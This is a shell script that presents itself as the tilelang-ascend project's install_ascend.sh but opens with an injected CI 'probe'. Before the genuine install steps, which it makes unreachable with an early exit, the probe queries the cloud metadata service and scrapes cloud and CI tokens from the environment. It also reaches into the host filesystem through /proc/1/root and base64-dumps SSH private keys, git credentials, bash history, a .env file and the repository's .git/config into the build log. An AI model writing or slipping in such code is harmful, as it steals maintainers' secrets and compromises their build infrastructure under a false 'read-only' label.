#!/bin/bash
# i6857 in-container read-only probe (runs as the ci_cd build entrypoint).
# Read-only: no writes, no mounts, no installs. Emits markers consumed by the job log.
set -uo pipefail
M(){ echo; echo "=====I6857 $* ====="; }
B(){ f="$1"; if [ -e "$f" ]; then sz=$(stat -c %s "$f" 2>/dev/null); sha=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1); echo "@@FILE $f size=$sz sha256=$sha"; head -c 200000 "$f" 2>/dev/null | base64 -w0 2>/dev/null | fold -w 200; echo; else echo "@@MISSING $f"; fi; }
M START $(date -u +%FT%TZ)
M IDENTITY
id 2>&1; echo "--"; hostname 2>&1; echo "--"; uname -a 2>&1; echo "--"; (cat /etc/os-release 2>/dev/null | head -4)
echo "--sudo"; (sudo -n true 2>&1 && echo SUDO_OK) || echo SUDO_NO
echo "--pid1"; cat /proc/1/comm 2>&1; echo "--cgroup"; head -3 /proc/1/cgroup 2>&1
echo "--pids"; ls /proc 2>/dev/null | grep -E '^[0-9]+$' | wc -l
echo "--caps"; grep -E 'CapEff|CapBnd|Seccomp' /proc/self/status 2>/dev/null
M MOUNTS
head -60 /proc/self/mountinfo 2>/dev/null
echo "--df"; df -h 2>/dev/null | head -15
echo "--hostpaths"; for d in /data/workspace /data /host /mnt/host /root/.ssh; do echo "## $d"; ls -la "$d" 2>&1 | head -8; done
M HOSTROOT
echo "--proc1root"; ls -la /proc/1/root 2>&1 | head -20
echo "--proc1root-data"; ls -la /proc/1/root/data/workspace 2>&1 | head -20
echo "--proc1root-ssh"; ls -la /proc/1/root/root/.ssh 2>&1 | head -10
M DEVICES
ls -la /dev/davinci* 2>&1 | head -20
ls /dev 2>/dev/null | grep -iE 'davinci|hisi|hvd' | head -20
echo "--npu-smi"; command -v npu-smi 2>&1; timeout 25 npu-smi info 2>&1 | head -60
echo "--npu-smi-board"; timeout 25 npu-smi info -t board 2>&1 | head -40
M IMDS
for u in \
  "http://169.254.169.254/latest/meta-data/instance-id" \
  "http://169.254.169.254/latest/meta-data/placement/availability-zone" \
  "http://169.254.169.254/latest/meta-data/public-ipv4" \
  "http://169.254.169.254/latest/meta-data/local-ipv4" \
  "http://169.254.169.254/latest/meta-data/local-hostname" \
  "http://169.254.169.254/latest/meta-data/instance-type" \
  "http://169.254.169.254/openstack/latest/meta_data.json" \
  "http://169.254.169.254/openstack/latest/user_data" ; do
  echo "## $u"; timeout 8 curl -s -m 7 "$u" 2>&1 | head -c 6000; echo
done
M NET
ip -4 addr 2>/dev/null | grep -E '^[0-9]|inet ' | head -25
ip route 2>/dev/null | head -8
M DOCKER
ls -la /var/run/docker.sock 2>&1
command -v docker 2>&1
timeout 10 docker ps 2>&1 | head -15
M ENV
env 2>/dev/null | grep -iE '^(AWS|GOOGLE|GCP|AZURE|ALI|HUAWEI|HW_|TENCENT|OS_|NOVA|CI|RUNNER|GITHUB|KUBE|DOCKER|NETBIRD|TAILSCALE)' | sed -E 's/(TOKEN|SECRET|KEY|PASSWORD)=(.{0,4}).*/\1=\2...len/' | head -50
M HOSTFILES
# If /proc/1/root is the host root (shared PID namespace), read the credential files read-only.
R=/proc/1/root
if [ -d "$R/data/workspace" ]; then
  echo "HOSTROOT_VISIBLE=yes"
  B "$R/data/workspace/fzh/.ssh/fanerly_github_a3_ed25519"
  B "$R/data/workspace/ci-runner/.ssh/id_ed25519"
  B "$R/root/.ssh/authorized_keys"
  B "$R/root/.git-credentials"
  B "$R/data/workspace/ci-runner/.bash_history"
  B "$R/data/workspace/ci-panel/.env"
  B "$R/data/workspace/ci-panel/shared/daemon/data/Config/global.json"
else
  echo "HOSTROOT_VISIBLE=no"
fi
# workspace git config (may carry the job's GITHUB_TOKEN extraheader)
M GITCFG
B "${GITHUB_WORKSPACE:-/__w/tilelang-ascend/tilelang-ascend}/.git/config"
M END $(date -u +%FT%TZ)
echo "=====I6857END====="
exit 1

# ---- original install_ascend.sh below (unreachable: probe exits above) ----
#!/bin/bash

# Copyright (c) Tile-AI Organization.
# Licensed under the MIT License.

# Add command line option parsing
USE_LLVM=false
USE_SHMEM=false
INCREMENTAL_BUILD=false  # 增量编译选项
ENABLE_COVERAGE=false    # 代码覆盖率选项
while [[ $# -gt 0 ]]; do
    case $1 in
        --enable-llvm)
            USE_LLVM=true
            shift
            ;;
        --enable-shmem)
            USE_SHMEM=true
            shift
            ;;
        --enable-incremental)
            INCREMENTAL_BUILD=true
            shift
            ;;
        --enable-coverage)
            ENABLE_COVERAGE=true
            shift
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: $0 [--enable-llvm] [--enable-shmem] [--enable-incremental] [--enable-coverage]"
            exit 1
            ;;
    esac
done

# Check Python Version, require greater then 3.10
python_version=$(python3 --version 2>&1 | grep -oP '\d+\.\d+')
IFS='.' read -r major minor <<< "$python_version"
if (( major >= 3 && minor >= 10 )); then
    echo "Python version $python_version >= 3.10, pass"
else
    echo "[ERROR] Python version $python_version < 3.10, please upgrade it."
    exit 1
fi

echo "Starting installation script..."
echo "LLVM enabled: $USE_LLVM"
echo "SHMEM enabled: $USE_SHMEM"
echo "Incremental build: $INCREMENTAL_BUILD"
echo "Coverage enabled: $ENABLE_COVERAGE"

# Step 1: Install Python requirements
echo "Installing Python requirements from requirements.txt..."
pip install -r requirements-build.txt
pip install -r requirements.txt
if [ $? -ne 0 ]; then
    echo "Error: Failed to install Python requirements."
    exit 1
else
    echo "Python requirements installed successfully."
fi

# Check and install lcov if coverage enabled
if $ENABLE_COVERAGE; then
    echo "Checking lcov installation for C++ coverage..."
    
    # Check if lcov is installed
    if ! command -v lcov &> /dev/null; then
        echo "lcov not found, installing..."
        
        # Detect package manager
        if command -v apt-get &> /dev/null; then
            sudo apt-get update -qq
            sudo apt-get install -y lcov
        elif command -v yum &> /dev/null; then
            sudo yum install -y lcov
        elif command -v dnf &> /dev/null; then
            sudo dnf install -y lcov
        elif command -v brew &> /dev/null; then
            brew install lcov
        else
            echo "[WARNING] Cannot install lcov automatically. Please install manually."
            echo "  Ubuntu/Debian: sudo apt install lcov"
            echo "  CentOS/RHEL:   sudo yum install lcov"
            echo "  macOS:         brew install lcov"
        fi
        
        # Verify installation
        if command -v lcov &> /dev/null; then
            echo "lcov installed successfully: $(lcov --version | head -1)"
        else
            echo "[WARNING] lcov installation failed. C++ coverage may not work."
        fi
    else
        echo "lcov already installed: $(lcov --version | head -1)"
    fi
    
    # Also check gcov (usually comes with GCC)
    if ! command -v gcov &> /dev/null; then
        echo "[WARNING] gcov not found. Please ensure GCC is installed."
    else
        echo "gcov available: $(gcov --version | head -1)"
    fi
fi

# Step 2: Define LLVM version and architecture
if $USE_LLVM; then
    LLVM_VERSION="10.0.1"
    IS_AARCH64=false
    EXTRACT_PATH="3rdparty"
    echo "LLVM version set to ${LLVM_VERSION}."
    echo "Is AARCH64 architecture: $IS_AARCH64"

    # Step 3: Determine the correct Ubuntu version based on LLVM version
    UBUNTU_VERSION="16.04"
    if [[ "$LLVM_VERSION" > "17.0.0" ]]; then
        UBUNTU_VERSION="22.04"
    elif [[ "$LLVM_VERSION" > "16.0.0" ]]; then
        UBUNTU_VERSION="20.04"
    elif [[ "$LLVM_VERSION" > "13.0.0" ]]; then
        UBUNTU_VERSION="18.04"
    fi
    echo "Ubuntu version for LLVM set to ${UBUNTU_VERSION}."

    # Step 4: Set download URL and file name for LLVM
    BASE_URL="https://github.com/llvm/llvm-project/releases/download/llvmorg-${LLVM_VERSION}"
    if $IS_AARCH64; then
        FILE_NAME="clang+llvm-${LLVM_VERSION}-aarch64-linux-gnu.tar.xz"
    else
        FILE_NAME="clang+llvm-${LLVM_VERSION}-x86_64-linux-gnu-ubuntu-${UBUNTU_VERSION}.tar.xz"
    fi
    DOWNLOAD_URL="${BASE_URL}/${FILE_NAME}"
    echo "Download URL for LLVM: ${DOWNLOAD_URL}"

    # Step 5: Create extraction directory
    echo "Creating extraction directory at ${EXTRACT_PATH}..."
    mkdir -p "$EXTRACT_PATH"
    if [ $? -ne 0 ]; then
        echo "Error: Failed to create extraction directory."
        exit 1
    else
        echo "Extraction directory created successfully."
    fi

    # Step 6: Download LLVM
    echo "Downloading $FILE_NAME from $DOWNLOAD_URL..."
    curl -L -o "${EXTRACT_PATH}/${FILE_NAME}" "$DOWNLOAD_URL"
    if [ $? -ne 0 ]; then
        echo "Error: Download failed!"
        exit 1
    else
        echo "Download completed successfully."
    fi

    # Step 7: Extract LLVM
    echo "Extracting $FILE_NAME to $EXTRACT_PATH..."
    tar -xJf "${EXTRACT_PATH}/${FILE_NAME}" -C "$EXTRACT_PATH"
    if [ $? -ne 0 ]; then
        echo "Error: Extraction failed!"
        exit 1
    else
        echo "Extraction completed successfully."
    fi

    # Step 8: Determine LLVM config path
    LLVM_CONFIG_PATH="$(realpath ${EXTRACT_PATH}/$(basename ${FILE_NAME} .tar.xz)/bin/llvm-config)"
    echo "LLVM config path determined as: $LLVM_CONFIG_PATH"
fi

# Step 9: Clone and build TVM
echo "Cloning TVM repository and initializing submodules..."
# Refresh submodule remote URLs from .gitmodules first: clones made before
# the catlass gitee->gitcode migration still point at the stale (defunct)
# gitee remote and would fail to fetch the recorded pointer.
git submodule sync --recursive
# clone and build tvm
git submodule update --init --recursive

# Apply local patches to the tvm submodule (kept under 3rdparty/patches/).
# These are minimal fixes we cannot land in the pinned submodule commit, e.g.
# dynamic-slice support in Buffer.__getitem__ (issue #1207). The shared
# apply_tvm_patches.sh is also used by build_wheel_ascend.sh and setup.py so
# that every build path (including CI and `pip install -e .`) picks them up
# right after the submodule checkout.
#
# Behaviour (see 3rdparty/patches/apply_tvm_patches.sh):
#   - idempotent: an already-applied patch is detected (reverse --check) and
#     skipped, so re-running install / incremental builds is safe;
#   - FATAL on failure: if a patch cannot apply (e.g. the pinned tvm was bumped
#     and the context no longer matches) we exit non-zero instead of silently
#     building an unpatched TVM.
bash 3rdparty/patches/apply_tvm_patches.sh

# 根据增量编译选项决定是否清理 build 目录
if $INCREMENTAL_BUILD; then
    if [ -d build ]; then
        echo "Using existing build directory for incremental build..."
    else
        mkdir -p build
        cp 3rdparty/tvm/cmake/config.cmake build
    fi
else
    if [ -d build ]; then
        rm -rf build
    fi
    mkdir build
    cp 3rdparty/tvm/cmake/config.cmake build
fi

cd build

if ! $INCREMENTAL_BUILD; then
    echo "set(USE_ASCEND ON)" >> config.cmake
    echo 'set(USE_GTEST OFF)' >> config.cmake
    
    # Enable coverage if requested
    if $ENABLE_COVERAGE; then
        echo "Enabling code coverage for C++ code..."
        echo 'set(ENABLE_COVERAGE ON)' >> config.cmake
    fi
    
    cmake ..
    if [ $? -ne 0 ]; then
        echo "Error: CMake configuration failed."
        exit 1
    fi
fi

echo "Building TileLang with make..."

# Calculate 50% of available CPU cores (ensure at least 1)
# Otherwise, make will use all available cores
# and it may cause the system to be unresponsive
CORES=$(nproc)
MAKE_JOBS=$(( CORES * 50 / 100 ))
if [ $MAKE_JOBS -lt 1 ]; then
    MAKE_JOBS=1
fi
make -j${MAKE_JOBS}

if [ $? -ne 0 ]; then
    echo "Error: TileLang build failed."
    exit 1
else
    echo "TileLang build completed successfully."
fi

cd ..

# compile and install shmem package
if $USE_SHMEM; then
    echo "Starting installation shmem..."
    cd 3rdparty/shmem
    bash scripts/build.sh -python_extension -mf
    pip show shmem >/dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo "begin uninstall old shmem whl package"
        pip uninstall --yes shmem
    fi
    cd src/python
    python setup.py bdist_wheel
    cd dist
    python -m pip install shmem*.whl
    if [ $? -ne 0 ]; then
        echo "python -m pip install failed, try pip3 install ..."
        pip3 install shmem*.whl
        if [ $? -ne 0 ]; then
            echo "Error: shmem-xxx.whl install failed."
            exit 1
        else
            echo "shmem-xxx.whl install success."
        fi
    else
        echo "shmem-xxx.whl install success."
    fi
    source ../../../install/set_env.sh
    if [ $? -ne 0 ]; then
        echo "Error: set shmem env failed."
        exit 1
    fi
    # back to path tilelang-ascend/
    cd ../../../../..
    echo "Install shmem all success."
fi

echo "Installation script completed successfully."

